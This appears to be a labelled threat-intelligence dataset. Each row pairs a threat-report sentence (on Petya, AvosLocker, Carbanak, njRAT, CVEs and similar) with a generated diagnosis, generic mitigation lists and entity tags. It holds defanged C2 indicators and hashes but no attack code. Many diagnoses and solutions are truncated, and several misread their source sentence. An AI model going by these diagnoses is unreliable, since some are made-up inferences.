621,"this post is also available in: 日本語 (japanese) this unit 42 blog provides an update on the threat situation surrounding attacks using the petya ransomware which are impacting organizations in ukraine, russia and to a lesser extent around the world.","diagnosis: petya ransomware attack entity: organizations in ukraine, russia, and around the world relationship: the petya ransomware targets organizations in ukraine and russia, and to a lesser extent, around the world.",1. regularly update software and operating systems to ensure they are protected against known vulnerabilities that can be exploited by ransomware attacks like petya. 2. implement and maintain strong passwords and two-factor authentication to prevent unauthorized access to sensitive data and systems. 3. conduct regular security audits and penetration testing to identify and address vulnerabilities in the organization's network and systems. 4. implement robust backup and disaster recovery plans to ensure that critical data can be restored in the event of a ransomware attack. 5,identity,malware,malware
14123,mattermost was being used as a c2 channel for the malware.,the cybersecurity issue is the use of mattermost as a c2 channel for malware. the entity involved in this issue is the software mattermost and the malware being used. the relationship between the entities is that the malware is using mattermost as a means,1. implement network segmentation to isolate the infected device and prevent the malware from spreading to other parts of the network. 2. use intrusion detection/prevention systems to monitor network traffic and identify any suspicious activity related to mattermost. 3. implement access controls and user authentication measures to restrict unauthorized access to mattermost and prevent the malware from using it as a c2 channel. 4. regularly update and patch mattermost software to address any known vulnerabilities that could be exploited by malware. 5. conduct regular,SOFTWARE,malware,
14341,the first variant of maikspy appeared on the windows platform in december 2016.,"diagnosis: the entity in question is the first variant of maikspy, which is a type of malware. the entity is related to the windows platform as it appeared on it in december 2016. the relationship between the two entities is that",1. implementing strong antivirus software that can detect and remove maikspy malware from windows systems. 2. conducting regular system updates and patches to ensure that vulnerabilities exploited by maikspy are addressed. 3. implementing network segmentation and access controls to limit the spread of maikspy within the network. 4. conducting regular security awareness training for employees to prevent them from falling victim to phishing attacks that may distribute maikspy. 5. implementing advanced threat detection solutions that can identify and,malware,TIME,SOFTWARE
1860,"while avoslocker has been documented for its abuse of anydesk for lateral movement as its preferred application, we note that other remote access applications can also be abused to replace it.","avoslocker malware uses remote access tools, including anydesk, as well as other applications, for lateral movement in attacks.",1. implementing network segmentation to restrict lateral movement of malware within the network. 2. deploying endpoint detection and response (edr) solutions to detect and respond to avoslocker malware. 3. enforcing strict access controls to prevent unauthorized access to remote access tools like anydesk. 4. conducting regular security awareness training to educate employees on how to identify and avoid phishing attacks that deliver avoslocker malware. 5. implementing two-factor authentication to prevent unauthorized access to sensitive systems and data,malware,tools,attack-pattern
288,"spear phishing attacks target organizations in ukraine, payloads include the document stealer outsteel and the downloader saintbot threat briefing: protecting against russia-ukraine cyber activity palo alto networks resource page: protect against russia-ukraine cyber activity cortex xdr protections against malware associated with ukraine and russia cyber activity","diagnosis: spear phishing attacks targeting organizations in ukraine are using the outsteel document stealer and saintbot downloader malware payloads. the attacks are likely originating from russia, and the entities targeted include both locations and identities. the malware is being used to target",1. implementing multi-factor authentication (mfa) to prevent unauthorized access to sensitive data and systems. 2. conducting regular security awareness training for employees to recognize and report suspicious emails or links. 3. deploying advanced threat detection and response solutions to identify and mitigate potential threats. 4. implementing email filtering and blocking to prevent malicious emails from reaching employees' inboxes. 5. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses. 6. implementing network segmentation,attack-pattern,malware,malware
1887,"what sets urpage attacks apart is its targeting of inpage, a word processor for urdu and arabic languages.","possible diagnosis: targeted attack. the threat actor identified in the second column is targeting a specific software, inpage, as indicated in the third column. this suggests a motive to exploit vulnerabilities or steal sensitive information related to the use of that software.",1. implementing network segmentation to limit the attacker's access to critical systems and data. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential vulnerabilities in the targeted software. 3. deploying intrusion detection and prevention systems to monitor network traffic and detect any suspicious activity. 4. implementing access controls and authentication mechanisms to restrict unauthorized access to sensitive information related to the targeted software. 5. conducting regular security awareness training for employees to educate them on the risks of targeted attacks and,SOFTWARE,threat-actor,
14253,"nearly all the c&c servers are hosted in the u.s., while two are located in japan.","possible diagnosis: the cybersecurity issue involves a command and control (c&c) infrastructure that is distributed across multiple locations, including the u.s. and japan. the relationship between the c&c servers and their physical locations is crucial for identifying potential sources of malicious",1. implement network segmentation to isolate the c&c infrastructure and limit its reach within the network. 2. deploy intrusion detection and prevention systems to identify and block malicious traffic from the c&c servers. 3. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network. 4. use advanced threat intelligence to monitor and track the activities of known threat actors and their c&c infrastructure. 5. implement access controls and authentication mechanisms to limit access to the c&c infrastructure and prevent unauthorized access,location,Infrastucture,
804,"credential theft today can happen in many ways, but the most notable are through credential phishing and the use of malware like keyloggers (both staples of the sofacy group), as well as password reuse.","credential theft via credential phishing, keyloggers, and password reuse is a common attack pattern utilized by the sofacy group, a known threat actor. the threat actor uses these attack patterns to steal credentials from their targets.",1. implementing two-factor authentication (2fa) or multi-factor authentication (mfa) to reduce the impact of stolen credentials. 2. conducting regular security awareness training to educate employees on the dangers of phishing attacks and password reuse. 3. using anti-phishing software to detect and prevent phishing attempts. 4. implementing endpoint protection solutions that include anti-keylogging capabilities. 5. implementing a password manager to encourage strong and unique passwords for each account. 6. monitoring network traffic for suspicious,attack-pattern,attack-pattern,attack-pattern
992,"recently, we found email accounts from top universities across the world being sold on taobao, the largest consumer-to-consumer (c2c) e-commerce platform in china.","possible diagnosis: data breach caused by a software vulnerability in the email account system of top universities, leading to the compromise of sensitive information. the compromised data was then sold on taobao, a c2c e-commerce platform located in china. the relationship",1. implement regular vulnerability assessments and penetration testing to identify and address any potential weaknesses in the email account system. 2. use multi-factor authentication to add an extra layer of security to the email accounts. 3. implement data loss prevention measures to prevent the unauthorized transfer of sensitive information. 4. monitor and analyze network traffic to detect any suspicious activity. 5. implement access controls and restrict access to sensitive information to authorized personnel only. 6. conduct regular security awareness training for employees to educate them on the importance,SOFTWARE,location,
3705,"on the other hand, fin7 performs hooking.",diagnosis: fin7 is using hooking as a method of attack.,1. implementing endpoint detection and response (edr) solutions that can detect and prevent hooking attacks. 2. conducting regular security audits and vulnerability assessments to identify and address potential security weaknesses that could be exploited by hooking attacks. 3. deploying anti-malware and anti-virus software that can detect and remove malicious code associated with hooking attacks. 4. implementing network segmentation and access controls to limit the ability of attackers to move laterally through the network and access critical systems,attack-pattern,threat-actor,
4872,"this group also has links to the original developers of h-worm, also known as njrat.","the diagnosis is that the entity in the second column is at risk of being infected by h-worm or njrat malware due to the relationship between the entities in the third column, which suggests that the malware may have been duplicated and spread to the",1. implementing strict access controls and user authentication protocols to prevent unauthorized access to the network and systems. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security gaps or weaknesses that could be exploited by malware. 3. deploying advanced endpoint protection solutions that use machine learning and behavioral analysis to detect and block malware in real-time. 4. implementing network segmentation to isolate critical systems and limit the spread of malware in case of an infection. 5. educating employees on safe,malware,malware,
4030,"we found that the threat actors used vulnerable internet information services (iis) server and exchange server vulnerabilities as entry points, and then installed web shells.","the diagnosis is that the organization's cybersecurity was compromised due to the exploitation of vulnerabilities in the internet information services (iis) server and exchange server. the threat actors were able to gain entry and install web shells, which allowed them to maintain access and",1. regular vulnerability scans and patching of the iis and exchange servers to prevent exploitation of known vulnerabilities. 2. implementation of a web application firewall (waf) to detect and block web shell attacks. 3. use of multi-factor authentication (mfa) for remote access to the servers to prevent unauthorized access. 4. regular monitoring of server logs and network traffic to detect any suspicious activity. 5. implementation of endpoint detection and response (edr) tools to detect and respond to any malware,vulnerability,vulnerability,attack-pattern
1252,"using autofocus to quickly search and correlate artifacts across the collective set of wildfire and other palo alto networks threat intelligence, we were able to associate the attacks with the group publicly known as “dragonok.”","the cybersecurity issue is malware. the entity involved is the threat actor group known as ""dragonok."" the relationship between the entities is that the malware was authored by the dragonok group.","1. implementing robust anti-malware software that can detect and block malware from entering the system. 2. regularly updating the operating system and software to fix any vulnerabilities that can be exploited by malware. 3. conducting regular security audits to identify any potential threats and vulnerabilities in the system. 4. implementing access controls to restrict access to sensitive data and systems to authorized personnel only. 5. educating employees on the dangers of malware and how to avoid falling victim to it, such as",malware,threat-actor,SOFTWARE
5056,"recently observed ips used in curious gorge campaigns: coldriver, a russian-based threat actor sometimes referred to as calisto, has launched credential phishing campaigns, targeting several us based ngos and think tanks, the military of a balkans country, and a ukraine based defense contractor.","diagnosis: credential phishing campaigns entities: - threat actor: coldriver (also known as calisto) - location: russia - attack pattern: credential phishing campaigns - identity: several us-based ngos and think tanks, the","1. implement multi-factor authentication: this solution will help to prevent unauthorized access to user accounts even if the attacker has obtained the user's credentials through phishing. by requiring a second form of authentication, such as a code sent to the user's mobile device, the likelihood of a successful attack is reduced. 2. conduct regular security awareness training: educating employees about the risks of phishing attacks and how to identify them can help prevent successful attacks. regular training sessions can help keep employees up-to-date on the",threat-actor,threat-actor,location
5249,"we correlated the anubisspy variants to sphinx’s desktop/pc-targeting malware through the following: shared c&c server, 86[.]105[.]18[.]107 shared technique of decrypting json files, and similarity between the file structures of anubisspy and sphinx’s malware similar targets (highly concentrated in middle eastern countries) figure 2: comparison of file structure in sphinx’s desktop/pc-targeting malware (left) and anubisspy (right)","anubisspy and sphinx's desktop/pc-targeting malware are correlated through the use of a shared c&c server and technique of decrypting json files, as well as similarity in file structure. both malware have similar targets highly concentrated in middle eastern","1. implement advanced threat detection and response tools that can identify and respond to threats in real-time, including the use of machine learning algorithms to detect anomalies in network traffic and behavior. 2. employ network segmentation to isolate critical systems and sensitive data from less secure systems, limiting the potential damage that can be caused by a successful attack. 3. conduct regular security assessments and penetration testing to identify vulnerabilities in the network and address them before they can be exploited by attackers. 4. use multi-factor authentication and strong",malware,location,IPV4
4031,"afterward, the .net loader (detected as nerapack) and the first stage backdoor (quasar remote administration tool aka quasar rat) were deployed on the compromised machine.","the diagnosis is a malware attack, where the .net loader (nerapack) and the first stage backdoor (quasar rat) were deployed on the compromised machine. the relationship between the entities is that the quasar rat was delivered by","1. implementing strong antivirus and anti-malware software that can detect and remove the nerapack and quasar rat malware. 2. conducting regular vulnerability assessments and penetration testing to identify and address weaknesses in the system that may be exploited by attackers. 3. implementing network segmentation to isolate critical systems from the rest of the network, reducing the risk of lateral movement by attackers. 4. implementing multi-factor authentication to prevent unauthorized access to sensitive systems and data. 5. conducting regular",malware,malware,malware
602,"in the past, hancitor was sent as a malicious attachment in a spam email which would then download and install the attackers’ final malware like a banking trojan.",diagnosis: the entity hancitor is being used as a malware in an attack pattern where it is sent as a malicious attachment in a spam email to download and install banking trojan. the relationship between the entities is that the attack pattern uses the malware,1. implement email filters and spam detection software to prevent malicious emails from reaching users' inboxes. 2. use antivirus software to detect and remove hancitor malware. 3. conduct regular security awareness training for employees to educate them on how to identify and avoid phishing emails. 4. implement two-factor authentication to prevent unauthorized access to sensitive information. 5. use intrusion detection and prevention systems to detect and block malicious traffic. 6. implement network segmentation to limit the spread of malware in the event of a,malware,attack-pattern,
3088,they grouped these vulnerabilities under the names “spectre” (cve-2017-5753 and cve-2017-5715) and “meltdown” (cve-2017-5754).,"the diagnosis is a vulnerability issue, specifically the spectre and meltdown vulnerabilities (cve-2017-5753, cve-2017-5715, and cve-2017-5754), which are related to the entity mentioned in the",1. implement software patches and updates from the operating system and hardware vendors to address the spectre and meltdown vulnerabilities. 2. utilize virtualization technology to isolate vulnerable systems and limit access to sensitive data. 3. deploy intrusion detection and prevention systems to detect and block attempts to exploit the spectre and meltdown vulnerabilities. 4. conduct regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities. 5. implement strong access controls and multi-factor authentication to prevent unauthorized access to vulnerable systems.,vulnerability,vulnerability,vulnerability
194,"this post was substantially updated march 31 to add information on phishing and scam attacks, cybersquatting trends, fake donation websites, dos attacks on ukrainian news sites and distribution of malicious binaries.","the diagnosis is a widespread cybersecurity threat that involves various attack patterns such as phishing and scam attacks, cybersquatting trends, fake donation websites, dos attacks on ukrainian news sites, and distribution of malicious binaries. the identity of the entity affected is",1. implementing multi-factor authentication for all accounts to prevent phishing attacks. 2. educating employees and users about identifying and reporting scam attacks and cybersquatting trends. 3. monitoring and taking down fake donation websites through collaboration with law enforcement agencies. 4. implementing strong ddos protection measures for ukrainian news sites. 5. using advanced threat intelligence tools to detect and prevent the distribution of malicious binaries.,attack-pattern,attack-pattern,attack-pattern
105,"for example, we found that conti operators use the cloud storage synchronization tool rclone to upload files to the mega cloud storage service.","conti threat actors are using malware to exfiltrate data to mega cloud storage service, and are utilizing the cloud storage synchronization tool rclone to facilitate this process.",1. implementing multi-factor authentication for mega cloud storage service accounts to prevent unauthorized access. 2. enforcing strict access control policies for rclone tool usage to prevent misuse. 3. deploying endpoint detection and response (edr) solutions to detect and block malicious activities. 4. conducting regular security awareness training for employees to educate them on the risks of using cloud storage services and how to identify and report suspicious activities. 5. implementing data loss prevention (dlp) solutions to prevent sensitive,malware,threat-actor,tools
3768,our research so far has shown one publicly known sample demonstrating exploitation of cve-2022-22960 by overwriting the /usr/local/horizon/scripts/publishcacert.hzn file.,"the entity /usr/local/horizon/scripts/publishcacert.hzn has been exploited through the vulnerability cve-2022-22960, as evidenced by the publicly known sample.",1. patching: install the latest security patches and updates to fix the vulnerability cve-2022-22960. 2. access control: implement strict access controls to limit access to the /usr/local/horizon/scripts/publishcacert.hzn file and other sensitive files. 3. antivirus/anti-malware: install and regularly update antivirus and anti-malware software to detect and remove any malicious code. 4. network segmentation: implement network segmentation to isolate critical systems,vulnerability,FILEPATH,
2398,"on march 29, 2022, the spring cloud expression resource access vulnerability tracked in cve-2022-22963 was patched with the release of spring cloud function 3.1.7 and 3.2.3.",diagnosis: the spring cloud expression resource access vulnerability tracked in cve-2022-22963 was identified and patched with the release of spring cloud function 3.1.7 and 3.2.3. the vulnerability was related to,potential cybersecurity solutions: 1. ensure that all systems and applications are updated with the latest security patches and versions. this will help to prevent known vulnerabilities from being exploited. 2. conduct regular vulnerability scans and penetration testing to identify any potential vulnerabilities in the system. 3. implement access controls and authentication mechanisms to limit access to sensitive resources and prevent unauthorized access. 4. use network segmentation and isolation to limit the spread of any potential attacks and minimize the impact of a breach. 5. implement intrusion detection and,TIME,vulnerability,vulnerability
3897,"the fact sheet comes after numerous ransomware attacks on key critical infrastructures in the us and abroad, including the attack on colonial pipeline by darkside.","possible diagnosis: targeted cyber attacks by threat actors on critical infrastructures in different locations, resulting in significant disruption and economic losses. the identity of the threat actor involved in the colonial pipeline attack, darkside, suggests a possible connection to ransomware-as","1. implementing multi-factor authentication and strong password policies to prevent unauthorized access to critical infrastructure systems. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security gaps. 3. deploying advanced threat detection and response tools to detect and respond to cyber attacks in real-time. 4. regularly backing up critical data and storing it in secure, off-site locations to prevent data loss due to cyber attacks. 5. developing and implementing incident response plans to minimize the",location,threat-actor,identity
2704,"on saturday, microsoft disclosed a critical vulnerability in internet explorer, cve-2014-1776, affecting internet explorer versions 6 through 11.",diagnosis: critical vulnerability in internet explorer (cve-2014-1776) entity: microsoft relationship: microsoft disclosed the vulnerability in internet explorer (cve-2014-1776) affecting versions 6 through 11.,"1. update internet explorer: microsoft has released a security update to address the vulnerability. users should update their internet explorer to the latest version to ensure their systems are protected. 2. use alternative browsers: users can switch to alternative browsers like google chrome or mozilla firefox, which are not affected by this vulnerability. 3. implement network security measures: organizations can implement network security measures like firewalls, intrusion detection systems, and antivirus software to prevent malicious attacks. 4. employee training: companies can provide cybersecurity training",TIME,identity,vulnerability
5245,sphinx reportedly uses the watering hole technique via social media sites to deliver its payloads — mainly a customized version of njrat.,"the campaign entity reportedly uses the malware entity via the ""uses"" relationship type to deliver customized versions of njrat via the watering hole technique on social media sites. this suggests a possible cybersecurity issue related to the distribution of malware through social engineering tactics.","1. implementing strict access control measures to prevent unauthorized access to social media sites and other potential watering holes. 2. educating users on how to identify and avoid social engineering tactics used to deliver malware. 3. deploying advanced threat detection and prevention technologies to identify and block malware delivered through watering hole attacks. 4. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the organization's cybersecurity defenses. 5. developing and enforcing strict cybersecurity policies and procedures for employees, contractors,",campaign,malware,
14220,"the payload is a file named loadoerf.ini that contains decryption, run, and code injection functions.","possible diagnosis: the entity with id 48249 represents a file named ""loadoerf.ini"" that contains malicious functions for decryption, code injection, and execution. the entity with id 48250 represents an attack pattern associated with the use of",1. implement advanced threat detection and prevention tools that can identify and block malicious files and attack patterns in real-time. 2. conduct regular vulnerability assessments and penetration testing to identify and address any security gaps in the network. 3. implement access controls and permissions to limit the number of users who can access sensitive files and systems. 4. educate employees on the importance of cybersecurity and provide regular training on how to identify and prevent cyber threats. 5. implement multi-factor authentication to ensure that only authorized users can,FILEPATH,attack-pattern,
645,"while we have not been able to directly confirm the source, we have seen evidence that a ukrainian software application called medoc was used by attackers to deliver the petya dll.","the diagnosis is that the ukrainian software application medoc was used as a delivery mechanism for the petya malware, indicating a significant cybersecurity breach. the relationship between the software entity and the malware entity suggests that the malware was specifically designed to exploit vulnerabilities in",1. implement regular software updates and patches to address vulnerabilities in the medoc application. 2. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the medoc application. 3. implement strong access controls and authentication mechanisms to prevent unauthorized access to the medoc application and its data. 4. implement network segmentation and firewalls to prevent the spread of malware from one system to another. 5. implement intrusion detection and prevention systems to detect and block malicious activity. 6. implement endpoint security,location,SOFTWARE,malware
3668,"after this, the carbanak backdoor can then be used to log keystrokes and capture screenshots, steal and delete cookies, inject malicious code on sites, and monitor various traffic.","the diagnosis is a carbanak backdoor malware attack on the entity with the potential to steal and delete cookies, inject malicious code on sites, and monitor various traffic. the backdoor is used to log keystrokes and capture screenshots, and the attack",1. implementing robust endpoint security solutions that can detect and prevent malware attacks like carbanak backdoor. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security gaps in the system. 3. deploying intrusion detection and prevention systems that can detect and block malicious traffic. 4. implementing strong access controls and authentication mechanisms to prevent unauthorized access to sensitive data. 5. providing regular security awareness training to employees to prevent social engineering attacks. 6. implementing network segmentation to,malware,attack-pattern,attack-pattern
5469,"while patchwork may be more straightforward with its predominantly malware-based attacks, confucius’ can be inferred to be more nuanced, relying heavily on social engineering.","diagnosis: the cybersecurity issue involves two threat actors, patchwork and confucius, with different attack patterns. patchwork relies predominantly on malware-based attacks, while confucius uses social engineering. the entities involved are the two threat actors and their","1. implement a multi-layered defense system that includes antivirus software, firewalls, and intrusion detection/prevention systems to detect and prevent malware-based attacks from patchwork. 2. conduct regular security awareness training for employees to educate them about social engineering tactics used by confucius, such as phishing and pretexting, and how to avoid falling victim to them. 3. monitor network traffic and user behavior to detect any suspicious activity that may indicate an attack from either patchwork or confucius. 4",threat-actor,attack-pattern,attack-pattern
4979,"we assess that these campaigns delivered alien, a simple android malware in charge of loading predator, an android implant described by citizenlab in december 2021.",diagnosis: android malware campaign delivering alien and predator implants entity: android malware relationship: drops predator implant after loading alien malware,1. implementing mobile device management (mdm) solutions to monitor and control mobile devices that access corporate networks and data. 2. implementing endpoint security solutions that can detect and prevent malware infections on android devices. 3. conducting regular security awareness training for employees to educate them on the dangers of downloading and installing apps from untrusted sources. 4. implementing network segmentation to prevent malware from spreading across the network. 5. using threat intelligence feeds to stay updated on the latest android malware campaigns and,TIME,malware,identity
5287,the sandworm apt group has been attributed as creating both cyclops blink and the vpnfilter internet of things (iot) botnet.,diagnosis: the sandworm apt group is attributed to creating both cyclops blink and the vpnfilter internet of things (iot) botnet.,1. implementing strong network segmentation and access controls to limit the spread of malware within the network. 2. deploying advanced threat detection and response tools to identify and mitigate any malicious activity associated with the sandworm apt group. 3. conducting regular security assessments and penetration testing to identify vulnerabilities in iot devices and network infrastructure. 4. implementing multi-factor authentication and strong password policies to prevent unauthorized access to sensitive systems. 5. keeping all systems and software up-to-date with the latest security patches,threat-actor,malware,malware
1260,"all of the sysget files used in this campaign communicate with a single command and control (c2) server, hosted at biosnews[.]info.","the diagnosis is that the entity (sysget files) is infected with malware, which communicates with a command and control (c2) server hosted at biosnews[.]info. the relationship between the entities is that the malware communicates with the c2","1. install and regularly update anti-malware software to detect and remove malware infections. 2. use a firewall to block communication with known malicious ip addresses and domains, including biosnews[.]info. 3. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network that could be exploited by attackers. 4. implement access controls and user authentication measures to prevent unauthorized access to sensitive data and systems. 5. educate employees on safe browsing practices and how to identify and report",url,Infrastucture,malware
3585,"next, let’s look for the attribute indicator, starting with the cyax assembly used in the notepadex attack.",the diagnosis is that the notepadex attack campaign uses the cyax assembly tool.,"1. implementing intrusion detection systems (ids) and intrusion prevention systems (ips) to detect and prevent notepadex attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network or system that could be exploited by attackers. 3. implementing access controls and authentication mechanisms to prevent unauthorized access to sensitive data and systems. 4. deploying endpoint protection solutions that can detect and block malicious activities on endpoints, including those related to notepadex attacks. 5",campaign,tools,
3458,"a notable characteristic of blackgear is the degree to which its attacks are taken to evade detection, abusing blogging, microblogging, and social media services to hide its command-and-control (c&c) configuration.","diagnosis: the threat actor blackgear is using multiple attack patterns, including evading detection through the use of blogging, microblogging, and social media services to hide its command-and-control configuration. the entity is blackgear, and the relationships between","1. implementing advanced threat detection and response systems that can identify and respond to the attack patterns used by blackgear. 2. deploying security tools that can detect and block access to blogging, microblogging, and social media services that are being used to hide command-and-control configuration. 3. conducting regular security audits and assessments to identify vulnerabilities that can be exploited by blackgear. 4. implementing multi-factor authentication and access controls to prevent unauthorized access to sensitive systems and data. 5.",attack-pattern,attack-pattern,attack-pattern
2866,late last month reports surfaced that a new internet explorer vulnerability (cve-2014-1776) was being exploited in targeted attacks.,the diagnosis is a software vulnerability in internet explorer (cve-2014-1776) being exploited in targeted attacks.,1. patching and updating internet explorer to the latest version to address the vulnerability. 2. implementing web application firewalls to detect and block malicious traffic targeting the vulnerability. 3. deploying intrusion detection and prevention systems to detect and block attempts to exploit the vulnerability. 4. conducting regular vulnerability assessments and penetration testing to identify and address any vulnerabilities in the system. 5. implementing access controls to limit access to sensitive systems and data to authorized personnel only. 6. providing cybersecurity awareness training to,SOFTWARE,vulnerability,
1529,"this post is also available in: 日本語 (japanese) in july 2020, microsoft released a security update, cve-2020-1350 | windows dns server remote code execution vulnerability, for a new remote code execution (rce) vulnerability.","diagnosis: the entity (windows dns server) is vulnerable to a remote code execution (rce) attack due to the cve-2020-1350 vulnerability. this vulnerability is being targeted by an attack pattern, indicating that threat actors are actively","1. patch management: ensure that the latest security patches are installed on the windows dns server to address the cve-2020-1350 vulnerability. 2. firewall: configure a firewall to block incoming traffic on port 53, which is used by dns servers, except for authorized sources. 3. network segmentation: segment the network to limit the exposure of the windows dns server to the internet and other untrusted networks. 4. access controls: implement strong password policies and limit access to the windows dns",TIME,identity,vulnerability
1787,"while previous avoslocker infections employ similar routines, this is the first sample we observed from the us with the capability to disable a defense solution using a legitimate avast anti-rootkit driver file (aswarpot.sys).","avoslocker malware targets a software entity, specifically a legitimate avast anti-rootkit driver file (aswarpot.sys), and also targets a specific location. this malware is capable of disabling a defense solution.",1. regular software updates: regular software updates can help to patch any vulnerabilities that may be exploited by malware like avoslocker. this can prevent the malware from gaining access to the system in the first place. 2. anti-malware software: investing in a reputable anti-malware solution can help to detect and remove malware like avoslocker from the system. the software should be regularly updated to ensure it can detect the latest threats. 3. firewall protection: a firewall can help to block,malware,FILEPATH,SOFTWARE
3361,python.biopass.a ee4150f18ed826c032e7407468beea3b1f738ba80b75a6be21bb8d59ee345466,"the entity with id 48977 is diagnosed with the cybersecurity issue python.biopass.a, which is indicated by the hash entity with id 10175 through a relationship of type ""indicates"".",1. implementing antivirus software that is capable of detecting and removing the python.biopass.a malware. 2. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities that could be exploited by attackers. 3. implementing network segmentation to limit the spread of malware and isolate infected systems. 4. providing regular cybersecurity training and awareness programs to employees to help them identify and report suspicious activity. 5. enforcing strong password policies and multi-factor authentication to prevent unauthorized access to sensitive,hash,malware,
13581,"some of the delivered malicious scripts attempt to install backdoors to the websites built with the ec-cube framework, which is popular in japan.","diagnosis: the ec-cube framework, popular in japan, is being targeted by malware that attempts to install backdoors to the websites built with it. the malware is specifically targeting tools used for website development and is related to the location of the framework",1. implement regular software updates and patches to the ec-cube framework to address any known vulnerabilities and prevent malware attacks. 2. use antivirus and anti-malware software to detect and remove any malicious code or backdoors installed by the malware. 3. monitor website traffic and server logs for any suspicious activity and investigate any anomalies immediately. 4. implement strict access controls and authentication mechanisms to prevent unauthorized access to the website and its development tools. 5. conduct regular security audits and penetration testing to identify any,tools,malware,location
2002,"the file description included the entry vlahmav, a play on words on clamav, and the developer named the ransomware helloxd and used another potential alias, uknow, as the developer of helloxd in the copyright section.","the entity in question is a software file with the name vlahmav, which has been identified as a type of malware. specifically, the malware is a ransomware called helloxd, and it has been developed by an individual using the alias u","1. implementing a robust anti-malware and antivirus software that can detect and block ransomware attacks like helloxd. 2. conducting regular security audits and vulnerability assessments to identify potential security weaknesses in the system. 3. ensuring that all software and operating systems are up-to-date with the latest security patches and updates. 4. implementing a strong password policy and multi-factor authentication to prevent unauthorized access to the system. 5. educating employees on cybersecurity best practices, such as identifying and",SOFTWARE,malware,malware
2879,"last year, exploitation of cve-2013-3163 targeted internet explorer 8 and earlier this year, we found exploitation of cve-2014-0322 in internet explorer 10.",the diagnosis is that the software entities (internet explorer 8 and 10) are vulnerable to exploitation of cve-2013-3163 and cve-2014-0322 respectively. the relationship between the vulnerabilities and the software entities is that the,1. upgrade to a newer version of the software entity that is not vulnerable to the identified cves. 2. implement patches or security updates provided by the software vendor to address the identified vulnerabilities. 3. implement network segmentation to isolate vulnerable software entities from other systems and networks. 4. implement intrusion detection/prevention systems to monitor and block attempts to exploit the identified vulnerabilities. 5. implement web filtering to block access to malicious websites that may exploit the identified vulnerabilities. 6. implement user awareness training to educate,vulnerability,SOFTWARE,SOFTWARE
14081,the slub campaign also exploited and used gnuboard websites as part of the infrastructure.,"diagnosis: the slub campaign is exploiting gnuboard websites as part of its infrastructure, indicating a potential vulnerability in the software. the relationship between the campaign and the software is one of exploitation, suggesting that the campaign is using known vulnerabilities in the software","1. update and patch software regularly to fix known vulnerabilities. 2. implement web application firewalls to monitor and block suspicious traffic. 3. install intrusion detection and prevention systems to detect and prevent attacks. 4. conduct regular vulnerability assessments and penetration testing to identify and address weaknesses. 5. limit access to sensitive data and systems to authorized personnel only. 6. educate employees on best practices for cybersecurity, such as avoiding suspicious emails and websites. 7. use multi-factor authentication to enhance login security. 8",campaign,SOFTWARE,
4450,"our threat analysis group, or tag, is dedicated to protecting users from threats posed by state-sponsored malware attacks and other advanced persistent threats.",possible diagnosis: identity theft or impersonation. the fact that there are two entities with identical labels and a relationship indicating duplication suggests that one of them may be a fake or fraudulent account created to deceive or manipulate the other entity or other users. this could,1. implement multi-factor authentication (mfa) to verify the identity of users and prevent unauthorized access to accounts. 2. regularly monitor and analyze user activity logs to detect any suspicious behavior or unusual patterns that may indicate identity theft or impersonation. 3. use encryption to protect sensitive data such as login credentials and personal information from being intercepted or stolen by hackers. 4. educate users on how to create strong passwords and avoid phishing scams that may lead to identity theft. 5. conduct regular security,identity,identity,
4369,trojan.w97m.confucius.b 654c7021a4482da21e149ded58643b279ffbce66badf1a0a7fc3551acd607312 trojan.w97m.confucius.c 712172b5b1895bbfcced961a83baa448e26e93e301be407e6b9dc8cb6526277f trojan.win32.dloadr.tioibelq,the entity 654c7021a4482da21e149ded58643b279ffbce66badf1a0a7fc3551acd607312 is diagnosed with trojan.w97m.confucius.b while the,"1. implementing strong antivirus software that can detect and remove trojan.w97m.confucius.b. 2. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 3. implementing firewalls and intrusion detection systems to prevent unauthorized access and suspicious activity. 4. educating employees on cybersecurity best practices, such as avoiding suspicious emails and not downloading unknown attachments. 5. implementing multi-factor authentication to prevent unauthorized access to sensitive data. 6. regular",hash,hash,malware
1572,"as detailed below, bad rabbit gains initial entry by posing as an adobe flash update.",the entity (software) is affected by malware (bad rabbit) through a related-to relationship where bad rabbit gains initial entry by posing as an adobe flash update.,1. regularly update software and operating systems to ensure that all security patches have been installed. 2. use antivirus software to detect and remove malware. 3. implement a policy of not downloading or installing software or updates from untrusted sources. 4. use firewalls to monitor and control incoming and outgoing network traffic. 5. implement user training and awareness programs to educate employees on how to identify and avoid phishing attacks. 6. use intrusion detection and prevention systems to monitor network traffic for signs of malware activity,malware,SOFTWARE,
13602,"the gh0st rat samples related to this campaign are obfuscated executable files, which decrypt the main payload in memory and execute its main export function named “shellex.” figure","malware infection - the entity is the gh0st rat samples and the relationship is that they are related to obfuscated executable files. these files decrypt the main payload in memory and execute its main export function named ""shellex.""",1. implementing robust anti-malware software that can detect and remove gh0st rat samples and other obfuscated executable files. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the system. 3. implementing strict access controls and user permissions to prevent unauthorized access and execution of malicious code. 4. providing regular security awareness training to employees to educate them on the risks of malware infections and how to avoid them. 5. implementing network segmentation and isolation to,FILEPATH,malware,
1893,the link between bahamut and urpage can be best discussed by way of the multiple malicious android samples that matched bahamut's code and had c&c belonging to the urpage infrastructure.,"bahamut and urpage are related through a malicious android sample that matched bahamut's code and had c&c belonging to the urpage infrastructure. this suggests that urpage is a threat actor with ties to the infrastructure used in the attack,",1. implement a strong network segmentation strategy to prevent lateral movement of malware from one system to another. 2. deploy advanced threat detection and response systems to identify and mitigate any potential threats originating from urpage infrastructure. 3. regularly update and patch all systems and applications to prevent vulnerabilities that could be exploited by threat actors. 4. conduct regular security awareness training for employees to help them identify and report suspicious activities. 5. implement multi-factor authentication and access controls to prevent unauthorized access to sensitive systems and data,Infrastucture,threat-actor,threat-actor
